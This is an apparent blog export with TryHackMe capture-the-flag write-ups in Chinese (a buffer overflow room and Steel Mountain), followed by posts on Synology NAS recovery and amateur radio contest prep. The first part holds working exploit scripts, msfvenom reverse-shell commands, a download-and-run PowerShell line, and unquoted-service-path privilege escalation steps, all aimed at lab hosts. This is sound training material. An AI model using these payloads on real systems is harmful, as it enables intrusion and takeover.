h7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9&quot; postfix = &quot;&quot; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(&quot;Sending evil buffer...&quot;) s.send(bytes(buffer + &quot;\\r\\n&quot;, &quot;latin-1&quot;)) print(&quot;Done!&quot;) except: print(&quot;Could not connect.&quot;) 执行他，程序崩溃了，预期行为。然后在调试器的命令栏中输入这些。 12# 2400 是我们创建的固定序列的长度 !mona findmsp -distance 2400 !mona findmsp: 这是 Mona 插件的一个核心命令，用于帮助你找到内存中的溢出位置。它主要用来计算从缓冲区起始位置到 EIP 寄存器的精确偏移量。Mona 会读取当前 EIP 的值，然后在这个值中搜索之前由 pattern_create.rb 生成的模式。 -distance 2400: Mona 会根据当前 EIP 中被覆盖的值（这是一个模式字符串的片段），在这个 2400 字节的模式字符串中查找这个片段，然后计算出它相对于模式字符串起始位置的偏移量。这个偏移量就是你需要填充的垃圾数据（As 或其他占位符）的长度，才能恰好覆盖到 EIP。 让我们记录下这个偏移值，也就代表在 1978 其后的 4 个字节，就是 EIP 的寄存器的位置了。 然后就是测试这个 offset 能用不，脚本中的 offset 设置成上面记下来的值，把之前脚本中的 payload 删掉（nano 编辑器剪切行是 CTRL+K），把 retn 设置成 “ABCD”，这个 “ABCD” 就是假的 EIP 要执行的地址，这里我们只是测试一下，看看 EIP 的值会不会变。 可以看到 EIP 变成我们想要的了，44 43 42 41 即反转的 ABCD，为什么这样，因为 x86-x64 架构都用的小端序。 找坏字符1234# 这段代码是生成 bytearray # -b 参数是排除掉生成这样的字符 # 这里排除掉了 \\x00 即空字节 !mona bytearray -b &quot;\\x00&quot; 然后用一个 python 脚本生成一段 bytearray 123for x in range(1, 256): print(&quot;\\\\x&quot; + &quot;{:02x}&quot;.format(x), end=&#39;&#39;) print() 把这段代码生成的东西放在之前的 python 脚本中的 payload 字段里面。 123456789101112131415161718192021222324import socket ip = &quot;10.10.3.91&quot; port = 1337 prefix = &quot;OVERFLOW1 &quot; offset = 1978 overflow = &quot;A&quot; * offset retn = &quot;ABCD&quot; padding = &quot;&quot; payload = &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot; postfix = &quot;&quot; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(&quot;Sending evil buffer...&quot;) s.send(bytes(buffer + &quot;\\r\\n&quot;, &quot;latin-1&quot;)) print(&quot;Done!&quot;) except: print(&quot;Could not connect.&quot;) 好，这样做了之后，再去服务器那边把程序打开，这边执行。 现在就要注意 ESP 寄存器的地址了。ESP 寄存器是栈的顶部指针，这里就不多赘述了，你可以把他理解他是一个临时存放数据的地方就行。 这段代码的作用是通过本地生成的 bytearray 和 ESP 中的 bytearray 相比对，找到错误的字符。 1!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 019EFA30 可以看到这里会有这几个会出错的值 00 07 08 2e 2f a0 a1，让我们删掉那些会出错的值，再生成一版来比对一下。 12345# 这个是去掉预定义的会出错的字符串 !mona bytearray -b &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; # 这是改好的 payload payload = &quot;\\x01\\x02\\x03\\x04\\x05\\x06\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff&quot; 好，这下一模一样了，没出错。OK，下一步。 **Tips：**一般一个出错的字符，他后面跟着错那个字符应该是好的。但是也不确定，也有可能是两个都会出错，可以用排除法解决。 找合适的跳转地址为什么要找到这个跳转地址呢，我们之前不是能控制 EIP 了嘛，现在需要一个地址，他的行为是能够跳转到 ESP 那里，这就是 JMP ESP。我们的 shellcode 不是在 ESP 那儿吗，这样做就能保证执行我们的 shellcode。 为什么不写死地址呢，因为每次执行溢出的时候，我们的代码段可能不会在硬编码的那儿，但是 JMP ESP 能保证每次跳转的都是在那儿，所以能稳定的触发 shellcode。 让我们找到一个跳板地址，并且这个地址不会被坏字符破坏。 12# 查找指向 ESP 的跳转指令，过滤含指定地址的字符 !mona jmp -r esp -cpb &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; 出来这么多，原文让我们随便挑一个，构造好的如下，注意是小端序。 1retn = \\xaf\\x11\\x50\\x62 生成马123# 用这行命令生成 # -b 是排除掉坏字符 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.141.2 LPORT=4444 EXITFUNC=thread -b &quot;\\x00\\x07\\x08\\x2e\\x2f\\xa0\\xa1&quot; -f c 1234# 把生成好的直接复制过来丢到 payload 就行，记得加上括号 payload = (&quot;你&quot; &quot;的&quot; &quot;马&quot;) 准备无操作字节（NOPs）NOPs 的主要作用是为编码后的 Shellcode 提供必要的解包空间和稳定性，这个作用就是字面意思。 1padding = &quot;\\x90&quot; * 16 顺利上线 结束简单画了个图，便于理解。","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"栈","slug":"栈","permalink":"https://blog.irec.moe/tags/%E6%A0%88/"}]},{"title":"Try Hack Me - Steel Mountain","slug":"THM/20250705_Steel_Mountain/Steel_Mountain","date":"2025-07-04T16:00:00.000Z","updated":"2025-07-07T17:54:09.000Z","comments":true,"path":"/thm_steelmountain.html","permalink":"https://blog.irec.moe/thm_steelmountain.html","excerpt":"","text":"0x0Room：https://tryhackme.com/room/steelmountain 这个房间可以说是我在 TryHackMe 上碰到的第一个需要用很多自己想法才能过的房间，其实别人也有很多题解的，但是每个人有不同的解法嘛，并且我觉得我把这个做出来之后感觉很有意思，也学了很多。 0x1刚开始就来了一个看不懂的题目，在这里卡了很久。 Who is the employee of the month? 去搜了一下知道是那个替罪羊，但是我就不知道问题是怎么和这个题目联系上的，直到访问了这个服务器的 IP 之后才发现，hhhh。 0x2就常规扫端口呗，nmap 一把梭。 1234567891011121314151617nmap -sV 10.10.208.117 -T4 # PORTSTATE SERVICE VERSION # 80/tcp open http Microsoft IIS httpd 8.5 # 135/tcp open msrpc Microsoft Windows RPC # 139/tcp open netbios-ssn Microsoft Windows netbios-ssn # 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds # 3389/tcp open ms-wbt-server Microsoft Terminal Services # 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) # 8080/tcp open http HttpFileServer httpd 2.3 # 49152/tcp open msrpc Microsoft Windows RPC # 49153/tcp open msrpc Microsoft Windows RPC # 49154/tcp open msrpc Microsoft Windows RPC # 49155/tcp open msrpc Microsoft Windows RPC # 49156/tcp open msrpc Microsoft Windows RPC # 49163/tcp open msrpc Microsoft Windows RPC # Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 题目问有另外一个端口跑着 HTTP 服务，试着访问一下 8080 看看。 12345http://10.10.106.44:8080/ HttpFileServer 2.3 Server time: 7/4/2025 8:42:11 AM Server uptime: 00:12:54 哟，这不是 HFS 吗，是 2.3 版本，应该是有洞的。 123456789101112$ searchsploit hfs 2.3 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- HFS (HTTP File Server) 2.3.x - Remote Command Execu | windows/remote/49584.py HFS Http File Server 2.3m Build 300 - Buffer Overfl | multiple/remote/48569.py Rejetto HTTP File Server (HFS) - Remote Command Exe | windows/remote/34926.rb Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary | multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Comma | windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Comma | windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Rem | windows/webapps/34852.txt ---------------------------------------------------- --------------------------------- 题目问我们 CVE 编号是什么，就去 exploit-db 上查查呗。然后看到了这个：https://www.exploit-db.com/exploits/39161，就是这个没错了。 最后一问是让我们去用 msf 利用漏洞去拿 shell，拿到之后 flag 也就在那几个位置呗，轻松秒杀。 1234567891011121314151617181920212223242526search 2014-6287 # exploit/windows/http/rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) &gt; run [*] Started reverse TCP handler on 10.11.141.2:5555 [*] Using URL: http://10.11.141.2:8080/gv4t5KWp [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /gv4t5KWp [*] Sending stage (177734 bytes) to 10.10.208.117 [!] Tried to delete %TEMP%\\cKRtdaA.vbs, unknown result [*] Meterpreter session 1 opened (10.11.141.2:5555 -&gt; 10.10.208.117:49245) at 2025-07-04 13:09:50 -0400 [*] Server stopped. meterpreter &gt; cd &#39;C:\\Users\\bill\\Desktop&#39; meterpreter &gt; ls Listing: C:\\Users\\bill\\Desktop ============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-09-27 07:07:07 -0400 desktop.ini 100666/rw-rw-rw- 70 fil 2019-09-27 08:42:38 -0400 user.txt meterpreter &gt; cat user.txt b04763b6fcf51fcd7c13abc7db4fd365 0x3标题写的是提权，这里其实是用 Windows 的服务的缺陷。 在 Windows 系统中，如果一个服务（Service）的可执行文件路径沒有用双引号完全括起來，且路径中包含空格，就会存在漏洞。 举例来说，如果服务路径是 C:\\Program Files\\My Service\\service.exe 但没有加引号，系统在启动时可能会误以为它要执行的是 C:\\Program.exe 或 C:\\Program Files\\My.exe。 攻击者可以利用这个缺陷，在这些被系统「误读」的位置提前放置一个恶意的同名可执行文件。由于服务通常以高权限运行（如 SYSTEM），当服务下次启动时，就会先执行攻击者的恶意程序，从而实现提权。 这里题目给我们提供了一个叫 PowerUp 的工具，去查看系统里面的可利用点。 123456meterpreter &gt; upload ~/Desktop/tq/PowerUp.ps1 meterpreter &gt; powershell_shell PS &gt; whoami steelmountain\\bill PS &gt; . .\\PowerUp.ps1 PS &gt; Invoke-AllChecks 然后 . .\\xxx 的 . 是 PowerShell 的一个操作符，他的作用是将一个脚本的内容载入并执行到当前 PowerShell 会话的「作用域 (Scope)」中。TBH 我是第一次见到这种用法，也算是涨姿势了。然后 Invoke-AllChecks 是这个脚本的一个函数，后面单独执行这条函数，可以这样来理解。 有一大堆回显，题目告诉我们只要关注 CanRestart 这个参数，然后看看哪个服务的路径没有用引号包裹其他，然后我就找到了这个。 12345678ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubdirectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt; CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths 这里就照搬原话吧，意思就是如果 CanRestart 是 True 的话，并且目录可写，我们就可以我们自己的马去替换掉这个服务，然后重启，就上线了。 The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program! 12# 生成反弹 Shell msfvenom -p windows/shell_reverse_tcp LHOST=10.11.141.2 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe 然后就是 upload，放文件，然后就不知道怎么办了。 1meterpreter &gt; upload ~/Desktop/tq/Advanced.exe 其实在这里卡了很久，因为不知道怎么重启这个服务，后面搜了一下，其实这个在房间最后一部分有写的。 12sc stop AdvancedSystemCareService9 sc start AdvancedSystemCareService9 顺利拿到 flag 123456789└─$ nc -lvnp 4443 listening on [any] 4443 ... connect to [10.11.141.2] from (UNKNOWN) [10.10.106.44] 49285 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;cd c:\\Users c:\\Users\\Administrator\\Desktop&gt;type root.txt type root.txt 9af5f314f57607c00fd09803a587db80 0x4第四部分呢，题目的用意就是让我们不要依赖 MSF，去下别人的 EXP 来利用，锻炼这个能力，说实话这个比第三问简单很多。 这里用的是 HFS 的洞，我还经常用这个来建文件共享来着呢，不过一般在内网用，这个作者做的新版 HFS 又不好用。 EXP 地址：https://www.exploit-db.com/exploits/39161 注意脚本要用 python2 执行，把里面的 ip_addr 和 local_port 改成你自己的，然后要起一个 HTTP 服务器，这里我用的 Python。记得要把下载好的 netcat.exe 改名成 nc.exe。 12└─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 脚本要执行两次，第一次是下 nc.exe ，第二次才是反弹 Shell，同样记得本地监听一下反弹的端口。 12345678└─$ nc -lvnp 5566 listening on [any] 5566 ... connect to [10.11.141.2] from (UNKNOWN) [10.10.106.44] 49323 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;whoami whoami steelmountain\\bill 这里题目就要我们用一个叫 winPEAS 的工具来收集系统的信息，用来判断系统的可注入点。我依然用之前起的 Python HTTP 服务端用来传文件。 1powershell -c &quot;Invoke-WebRequest -Uri http://10.11.141.2/winPEASx64.exe -OutFile C:\\Users\\Public\\winPEASx64.exe; C:\\Users\\Public\\winPEASx64.exe&quot; 这个工具能显示的非常非常多，看不过来了都。他意思是让我们利用里面发现的注入点，我懒懒就没有去研究了。 后面问了一个如何用 PowerShell 获取服务名字，这不是基操吗？ 1powershell -c &quot;Get-Service&quot; 0xff做完这个 Room，感觉收获很大，本来这个原文是做的小抄的，但是一下记了挺多东西的，想了想不如写一个 Writeup 了，就有了这篇文章。","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"}]},{"title":"灵车固态炸了整台群晖","slug":"硬件/20250203_黑群晖系统盘爆炸恢复记录/黑群晖系统盘爆炸恢复记录","date":"2025-02-02T16:00:00.000Z","updated":"2025-07-07T17:19:51.000Z","comments":true,"path":"/ssd_boom_dsm.html","permalink":"https://blog.irec.moe/ssd_boom_dsm.html","excerpt":"","text":"0x0 警告2024年1月27日早上收到了 NAS 发过来的邮件推送，那时候我还正熟睡，起来之后看到邮件后并没有觉得有什么事情，下午登录进去之后发现 SSD 掉了，那就重启一下吧。 关机等了一会，给他开机，等了很久很久很久（10min+），还没进系统，接了个 HDMI 采集卡看了一下引导成功了，然后就接到了第一张图的那封邮件。进他的 Web 界面很卡很卡，我在想这是怎么了，SSD 都这么卡吗，然后果断关机。给这块 SSD 接电脑上看了看。 0x1 硬盘爆炸接上电脑用 CDI 看了看他的 SMART，没看到有异常。算了一下 PE 数 74986 &#x2F; 256 ≈ 293 PE，还好？ 然后给整盘做镜像，这时候就发现速度不对了，只有 30M&#x2F;s，那行，等你慢慢做完。 然后我正好有一块同型号的灵车硬盘，在我的软路由里，拆了他取出来准备做一下克隆，顺便看了一下 SMART 情况，还好。 0x2 尝试保留数据迁移硬盘参考了一下网上的教程，想保留数据迁移硬盘，踩坑很多很多，就不详细叙述了，简单总结一下我尝试过的方法。 使用扇区到扇区对拷硬盘 提示配置丢失，需要重装 使用系统内组 RAID 1 的方法恢复单独插另一块做好 RAID 的盘，提示配置丢失，需要重装两块盘一起插，提示配置丢失，需要重装原硬盘盘位不对，提示配置丢失，需要重装单独插原硬盘盘位插回去 提示配置丢失，需要重装单独插原硬盘盘位插回去 拔出其他所有盘，能开机 在此期间等的时间很久很久，等他同步一次数据和克隆硬盘都要2h以上，那个没坏的硬盘也是个垃圾货。 这里测试结果不代表不能以这种方式更换系统盘，我猜是因为我那块盘变成只读状态了，导致没法这样操作。 坑还有群晖在硬盘出现问题后会自动触发数据清理，这个时候碰上这种盘根本没法操作任何东西，IO直接爆了。 在后面系统会直接卡死什么也做不了，所以我要在他开机之后马上去停止掉他这个数据清理。 直接在存储管理器暂停计划是没有用的，必须要在计划数据清理里面把启用数据清理计划的勾去掉，才能关掉他在运行的数据清理。 0x2 放弃在后面直接没办法了，反正所有数据都有备份，直接重装整个 DSM，顺便把引导也更新到了7.2.1，是最后一个官方支持 AME 的版本。 从群晖系统盘恢复 VMM对于我来说，NAS 的作用更多体现在 Server 上，所以我 VMM 上跑了一些虚拟机。Docker 的话则好办，数据目录是分离的并且我也做好了备份，重新拉一下镜像部署一下就恢复了。而 VMM 则麻烦很多，看到 Reddit 的一个帖子 How can I recover synology VMs in a disaster? 。 There are no real VMM backup solutions, except by backing up all data from inside the VM. This makes VMM virtually useless for serious business use. 看到这我瞬间寒心了，然后想了想既然是 VM 那肯定有 VHD。这篇帖子、另一篇有提到 VMM 的虚拟磁盘存放位置。 &#x2F;volume#&#x2F;@iSCSI&#x2F;LUN&#x2F;VDISK_BLUN is the directory that houses the GUIDs…that house the disk files named by UUID. 所以我用 UFS Explorer Professional Recovery ，打开备份出来的的整个硬盘镜像。 可以看到有一个 233G 的 btrfs 分区，打开之后发现根目录都是 Docker 容器生成的文件夹，打开来看亦是。 找到 @iSCSI&#x2F;LUN&#x2F;VDISK_BLUN 打开看发现是空的，然后发现根目录有类似 UUID 一样的文件夹，打开一看，好家伙这不就是么。 vdisk.xxxx 静静的躺在里面，导出来一看正是我 VMM 里面虚拟机之一。为什么有那么多是因为我开了快照，里面有不同版本的很多个 vdisk，找了一下把各个虚拟机的修改日期最新的 vidsk 导出来，然后用 V2V 转成 VMDK，再导入新的 VMM 里面（此处省略步骤），完美恢复。 0x3 更换 S3610在小黄鱼买了一块 S3710 480G ，花了 180CNY（2025年2月），使用组 RAID1 再降级的方式更换硬盘，参考教程 五步操作将群晖RAID1阵列降级为Basic模式。 很顺利，最后手动扩充一下存储池，大功告成。 剩下的就是一些套件设置和用户恢复了，还好群晖用户数据是放在存储池下的 homes 目录里面，这样迁移机器保留硬盘不会丢数据，只需要重新建立一下用户就行。 而 Docker 因为我有把单独的数据目录备份，直接 pull 最新的镜像，重新配置一下存储空间和端口映射就完事了。 0x4 后记远离灵车硬盘！远离灵车硬盘！远离灵车硬盘！ 灵车拿来玩玩或是当 Steam 硬盘可以，但是像我这样把他当成主力盘用的话，真的可能就数据火葬场了，这是我第一次碰到在用的硬盘爆炸的，把我折腾不轻（以前是玩坏的，多写几轮直接暴毙那种，坏了就垃圾桶）。 我的数据都有备份，但是重新配置是真的折磨人。我买 S3610 也是看中了他的传家宝特性，希望能活久一点，不希望再有下一次了。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"},{"name":"硬盘","slug":"硬盘","permalink":"https://blog.irec.moe/tags/%E7%A1%AC%E7%9B%98/"},{"name":"灵车","slug":"灵车","permalink":"https://blog.irec.moe/tags/%E7%81%B5%E8%BD%A6/"}]},{"title":"BH7FBP 2024 CQWW SSB SOSB LP 10m 比赛记录","slug":"无线电/BH7FBP_2024_CQWW_SSB_SOSB_LP_10m","date":"2024-12-10T04:00:00.000Z","updated":"2024-12-10T20:53:34.000Z","comments":true,"path":"/cqwwssb2024.html","permalink":"https://blog.irec.moe/cqwwssb2024.html","excerpt":"","text":"背景2021 年，我接触了业余无线电。但我的实际活动是从今年也就是 2024 年开始的，年初有幸认识到岳阳本地的友台，BG7HTS 送了一根 UV 八木天线，BD7BS 送了两根鱼竿，从此开始我的业余无线电生涯。 3 月通过 BG6HNY 帮助注册了 QRZ 和 LOTW，4 月开始打星，6 月开始玩短波，按捺不住想拥有一台自己的短波机，托朋友从日本带了一台 IC-7300，对于那时候还是学生的我来说，钱包大出血：(。 等电台来的路上就是开始研究各种除电台之外的配件咯，看了看市面上成品的配件真的好贵，对于没收入的我来说太贵太贵了。刚好自己喜欢动手，就 DIY 了电池组、GP 天线给短波做准备。电池组是 PDD 砸金蛋 5 折买的力神 40LA，3 串，后面改成 4 串了，折腾过程在这里。GP 天线则是 5.6m 的拉杆 + CNC 切的底座 + 高压绝缘子攻丝 + 镀锌管钉 + 16P 软排线 + 香蕉插头插座，里面的就拉杆和软排线最贵，39+12。 机器到了之后反而没时间玩了，因为即将毕业，要搞毕设之类的，忙成狗~ 上图是最后一次在学校野架。 后来忙完毕业的事宜，在等待工作的间隙中，一根 GP 天线挂窗台干了 2 个月，拿到了 DXCC 100。 9 月，接触除 GP 天线之外的天线制作。从成品巴伦+旧电线在自家阳台上架了一个倒 V，被低底噪惊艳到，从此打开了 DP 的大门。第一根正 V 天线利用 BD7BS 送的鱼竿，自己画了一个适配的底座，实战效果很棒。 老是往外跑太折腾人了，就研究端馈天线，计划在两栋楼之间架设。但是看到成品的巴伦太贵，就开始研究巴伦，买了一堆磁环。 同样也是通过 BD7PRC 引导，开始玩 6m ，从 BG7XWF 那里买了一根八木天线，看到了他的做法，准备也用它那种铝管套接 + 管夹的做法来做天线，然后 DIY 了一根 6m - 10m 的正 V 天线，现在仍在阳台服役。 上图为自己设计的固定底板。 此次参赛也属于机缘巧合，还是从 BD7PRC 那里得知会举行 SSB 的全球性的比赛，我从来没参加过这种比赛，对我来说很陌生，也充满着挑战性 。比赛不仅对于我这种只在菜市场通联过的人是一种挑战，同时也能锻炼我的能力（事实证明确实真的锻炼到了)。比赛是能很好地检验自己的通讯基础设施和能力的，刚好自己在研究天线，对于我来说是一次很好的锻炼机会。 备赛期间10月20号跟我父亲详聊了一下，告诉了他这件事，表示支持并且询问了我需要什么样的场地，我说人烟稀少，场地开阔，远离城市。准备带我去本地的双桥水库，我带了 GP 和 EFHW 去测试一下底噪。 实际上测试效果还可以，这是用 GP 天线测出来的底噪，P2 指的是 2 级前放，OVF 指的是过载，可能是附近有强干扰源。 12345678910160m P2 S0 80m P2 S3 40m P2 S4 30m S3 20m S5 17m S2 15m S4 OVF 12m P2 S3 OVF 10m P2 S2 OVF 6m P2 S0 把 GP 架起来做了几个 QSO，通联了 BD3UDA、BD7NIG、BD4QB、BI8FRF、BD4UBG 几位老师，收他们的信号都非常好，全部都是 59，他们给我的信号报告从 59 到 45，感觉还可以，通联的比较顺利没有拉扯。 后来去水库旁边的堤坝上面架了一个端馈天线，挂了一下 FT8 ，玩了玩自己在家玩不了的 40m 波段，测试起来效果一般，振子线偏长了，另外架设高度也偏低，只有 15m 波段驻波比较好。 太阳消失，妖风作祟，正好母亲打电话来了，收拾战场回家。 坐摩托回去的路上被风吹得头疼，在抉择是否参加这次比赛，如果我真的参加的话，对于我来说太艰苦了，再加上天气也不好，搞的人生病了就不好说了。回去和母亲说了一下，母亲说要不去他同事家里，有电有水有饭吃，那我一拍即合。行，麻烦了。第一次用正 V 天线野架就是在那边，底噪很优秀，就是路不太好走。 10月21号去 BA5CW 的网站和 HelloCQ 论坛上看了看前辈们的参赛经验以及注意事项，阅读了 CQWW SSB 的比赛规则，参考了 BG2FFJ 的教程 把电脑的 N1MM 配好，之后越想越不对，我套天馈参加比赛是否有点太烂了，现有的只有 EFHW、GP、DP 这三种类型的天线，想整个 2 单元的八木，去老外的网站上看了看相关的文章，突然在 POTA 群 BG2BFG 发了一张图。 这是 BG8AMG 设计的用拉杆天线做的八木，我看了看视频，里面绝大部分的配件我有，就意味着我可以用非常小的开支造一条能用的八木天线出来，然后拟定了一张 BOM 表。 名称 数量 价格 型材 2020 1.8mm厚 1m长 2 18.82 双头内螺纹圆柱 18 * 30 * M10 1 0.27 铝型材一字连接件 欧标20型-M5+顶丝4个 4 3.01 304滑块 欧标 20-M6 5 1.56 内六角螺丝 M6*10 10 0.52 骑马扣 18φ 5 0.56 骑马扣 40φ 5 2.97 拉杆 5.6m 1 47.53 以下为现有的 巴伦 1:1 1 拉杆 5.6m 3 绝缘子 40φ 1 之后在淘宝上火速下单，等待到货，另外还买了个蛋卷桌~ 10月22号-10月25号这期间在通过 FT8 研究传播规律，最终波段敲定 